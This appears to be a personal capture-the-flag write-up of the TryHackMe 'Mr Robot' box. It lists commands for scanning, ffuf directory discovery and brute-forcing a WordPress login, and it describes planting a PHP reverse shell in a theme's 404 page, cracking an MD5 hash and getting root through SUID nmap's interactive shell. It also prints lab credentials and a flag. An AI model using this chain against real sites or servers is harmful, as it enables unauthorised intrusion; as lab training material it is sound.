# NOTES
Mr Robot CTF is a Medium box I found on THM on a fine lovely cool afternoon. This box's purpose is to mainly integrate note-taking into our workflow with "hacking". 

## SUMMARY
	1. The box started with a very beautiful and complex website. 
	2. found a list of passwords and bruteforced the login for the wordpress website after finding ze username. 
	3. Reverse shell through PHP injection on the WP theme 404 pages editor. 
	4. User Priv esc was simple md5 hash password cracking
	5. Root Priv esc was through suid for nmap.

## THINGS WE LEARNED
Aside from humility and the lack of my ability, here are somethings we learned from the "box" : 

	1. Sort your wordlists
	2. WPSCAN is the boi for wordpress websites
	3. ALWAYS use "ls -al" instead of plain "ls"
	4. Logging into another user's shell can be done through "su {username}"
	5. Check the GTFO bins pages properly and then do more research


# BOX 
All Attachments seen below will be found in their respective directories (refer to link) or will be in the [[Attachments]] sub-folder.

## ENUMERATION

#### NMAP SCAN

	nmap -sC -sV --min-rate=10000 10.10.125.48 -oN ./Enumeration/detailedScan.nmap  
	
![[Pasted image 20211122210239.png]]

#### PORT 80

This is easily the most beautiful website I've used in my life. We're greeted with a terminal interface looking UI and here are some screenshots that seemed to have relevance. 

This first one is just to admire how beautiful this website is. 
![[Pasted image 20211122211931.png]]

We see a set of credentials for root: 
![[Pasted image 20211122211906.png]]

From the main page, we can see 6 available commands:
![[Pasted image 20211122212045.png]]

- prepare : 
- fsociety : Displays the http://10.10.125.48/fsociety
- inform : Displays http://10.10.125.48/inform
- question : Displays http://10.10.125.48/question
- wakeup : Displays http://10.10.125.48/wakeup
- join : Displays http://10.10.125.48/join

Join page however does have some very special functionality, where it takes emails. 

![[Pasted image 20211122213733.png]]

After entering them we were taken to different pages based on the command. 


##### ROBOTS.TXT
- First stop should always be robots. We found some nice hidden file and ALSO got the first flag.
![[Pasted image 20211124175555.png]]

#### First Flag
- http://10.10.66.191/key-1-of-3.txt
![[Pasted image 20211124175718.png]]

##### fsocity.dic
- http://10.10.66.191/fsocity.dic
- Downloaded a dictionary file, possibly a good starting point for password cracking

###### Sorting and Cleaning : fsocity.dic
- We noticed (from a walkthrough) that the fsocity file wasn't sorted. 
- Upon sorting, we notice a lot of duplicates
- Ran the below command to clean the file for password bruteforcing 

			sort fsocity.dic | uniq > sortedUF.dic

#### FFUF Scan 
- found a lot of files that redirected to wordpress login 
	
			 ffuf -u http://10.10.66.191/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -e .php -o Desktop/CTFs/THM/Mr\ Robot\ CTF/Enumeration/directoriesScan.ffuf     
			 
![[Pasted image 20211124182629.png]]



#### xmlrpc.php
- found a page that takes post requests, something to do with WP specific exploit
![[Pasted image 20211124182436.png]]

## EXPLOIT
- Tried Logging in with username "elliot" on wordpress login and confirmed a user called elliot




### FFUF wp_login BruteForcing

- Captured the login packet for that wp-login
![[Pasted image 20211124184921.png]]

- Saved the packet as ./Exploit/login_bruteForce.txt and added key word "FUZZ" in the password parameter for post data 

			POST /wp-login.php HTTP/1.1
			Host: 10.10.66.191
			User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
			Accept-Language: en-US,en;q=0.5
			Accept-Encoding: gzip, deflate
			Content-Type: application/x-www-form-urlencoded
			Content-Length: 105
			Origin: http://10.10.66.191
			Connection: close
			Referer: http://10.10.66.191/wp-login.php
			Cookie: s_cc=true; s_fid=28069F760A2B93F8-0A1039ABBDCAD4E6; s_nr=1637797173024; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
			Upgrade-Insecure-Requests: 1

			log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.66.191%2Fwp-admin%2F&testcookie=1
			
			
- Bruteforcing through FFUF. filtering packet size 1478 to avoid wrong password cases


			ffuf -request ./login_bruteForce.txt -w ../Enumeration/sortedUF.dic:FUZZ -fs 1478 | tee ./bruteforcing.out

- Found the below password to have worked: 
				
			ER28-0652
			
![[Pasted image 20211124193400.png]]



## REVERSE SHELL
- Visited [HackTricks Page for the WP exploits](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce)
- We used ze Pentester PHP rev shell payload from Hacktools

![[Pasted image 20211124200304.png]]

- Uploaded it in the suggested 404.php file for the theme

![[Pasted image 20211124200653.png]]

- set up netcat listener on our end and got the REV SHELL
- Upgraded rev shell through python and stty

![[Pasted image 20211124200400.png]]



## POST-EXPLOIT

### ROBOT user access
- We found out we had jack shit for access

		daemon@linux:/home/robot$ id
		uid=1(daemon) gid=1(daemon) groups=1(daemon)

- Moved to home to see the robot user and found a MD5 Hashed passwords file 

		daemon@linux:/home/robot$ ls -al
		total 16
		drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
		drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
		-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
		-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
		daemon@linux:/home/robot$ cat password.raw-md5 
		robot:c3fcd3d76192e4007dfb496cca67e13b

- Cracked it on Crackstation and got the credentials: 

		robot:abcdefghijklmnopqrstuvwxyz
		
![[Pasted image 20211124201558.png]]

- We log into the ROBOT user shell through 

		su robot
		Password: abcdefghijklmnopqrstuvwxyz
		

### ROOOT user access

- Checking for SUID 
	
		robot@linux:/$ find / -perm /4000 2>/dev/null
		
		/bin/ping
		/bin/umount
		/bin/mount
		/bin/ping6
		/bin/su
		/usr/bin/passwd
		/usr/bin/newgrp
		/usr/bin/chsh
		/usr/bin/chfn
		/usr/bin/gpasswd
		/usr/bin/sudo
		/usr/local/bin/nmap
		/usr/lib/openssh/ssh-keysign
		/usr/lib/eject/dmcrypt-get-device
		/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
		/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
		/usr/lib/pt_chown
		
- Abusing SUID on nmap to spawn a root shell

		robot@linux:/$ /usr/local/bin/nmap --interactive

		Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
		Welcome to Interactive Mode -- press h <enter> for help
		nmap> !sh
		# whoami
		root
		# cat /root/key-3-of-3.txt
		04787ddef27c3dee1ee161b21670b4e4


# CELEBRATIONS!
![[Pasted image 20211124205016.png]]